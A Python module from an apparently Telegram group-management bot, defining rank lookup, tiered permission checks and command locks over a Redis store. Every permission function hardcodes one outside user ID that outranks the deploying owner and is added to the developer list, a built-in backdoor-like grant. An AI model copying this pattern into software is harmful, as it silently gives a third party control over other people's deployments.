import logging
from config import *
import re
async def get_rank(id, cid) -> str:
   if id == 6646631745 or id == 6646631745:
      return 'Aec🎖️'
   if id == int(Dev_Zaid):
      return 'البوت'
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return 'Dev🎖️'
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return 'Dev²🎖'
   if await r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return 'Myth🎖️'
   if await r.get(f'{id}:gban:{Dev_Zaid}'):
      return 'محظور عام'
   if await r.get(f'{id}:mute:{Dev_Zaid}'):
      return 'محظور عام'
   if await r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      _rk = await r.get(f'{cid}:RankGowner:{Dev_Zaid}')
      if _rk:
         return _rk
      return 'المالك الاساسي'
   if await r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      _rk = await r.get(f'{cid}:RankOwner:{Dev_Zaid}')
      if _rk:
         return _rk
      return 'المالك'
   if await r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      _rk = await r.get(f'{cid}:RankMod:{Dev_Zaid}')
      if _rk:
         return _rk
      return 'المدير'
   if await r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      _rk = await r.get(f'{cid}:RankAdm:{Dev_Zaid}')
      if _rk:
         return _rk
      return 'ادمن'
   if await r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
      _rk = await r.get(f'{cid}:RankPre:{Dev_Zaid}')
      if _rk:
         return _rk
      return 'مميز'
   else:
      _rk = await r.get(f'{cid}:RankMem:{Dev_Zaid}')
      if _rk:
         return _rk
      return 'عضو'

async def admin_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if await r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      return True
   else:
      return False

async def mod_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if await r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   else:
      return False

async def owner_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if await r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   else:
      return False

async def gowner_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if await r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   else:
      return False

async def dev_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if await r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   else:
      return False

async def dev2_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   else:
      return False

async def devp_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(Dev_Zaid):
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   else:
      return False


async def pre_pls(id, cid) -> bool:
   if id == 6646631745 or id == 6646631745:
      return True
   if id == 6646631745 or id == 6646631745:
      return True
   if id == int(await r.get(f'{Dev_Zaid}botowner')):
      return True
   if id == int(Dev_Zaid):
      return True
   if await r.get(f'{id}:rankDEV2:{Dev_Zaid}'):
      return True
   if await r.get(f'{id}:rankDEV:{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankGOWNER:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankOWNER:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankMOD:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankADMIN:{id}{Dev_Zaid}'):
      return True
   if await r.get(f'{cid}:rankPRE:{id}{Dev_Zaid}'):
      return True
   else:
      return False

   
async def get_devs_br():
   list = []
   if not int(await r.get(f'{Dev_Zaid}botowner')) == 6646631745:
      list.append(6646631745)
   list.append(int(await r.get(f'{Dev_Zaid}botowner')))
   if await r.smembers(f'{Dev_Zaid}DEV2'):
      for dev2 in await r.smembers(f'{Dev_Zaid}DEV2'):
         list.append(int(dev2))
   return list


async def isLockCommand(fid: int, cid: int, text: str):
   if not await r.hgetall(Dev_Zaid+f"locks-{cid}"):
      return False
   else:
      commands = await r.hgetall(Dev_Zaid+f"locks-{cid}")
      if text not in commands: return False
      for command in commands:
         cc = int(commands[command])
         if command.lower() in text.lower():
            logging.debug(text)
            logging.debug(command)
            if cc == 0:
               if not await gowner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 1:
               if not await owner_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 2:
               if not await mod_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 3:
               if not await admin_pls(fid, cid):
                  return True
               else:
                  return False
            if cc == 4:
               if not await pre_pls(fid, cid):
                  return True
               else:
                  return False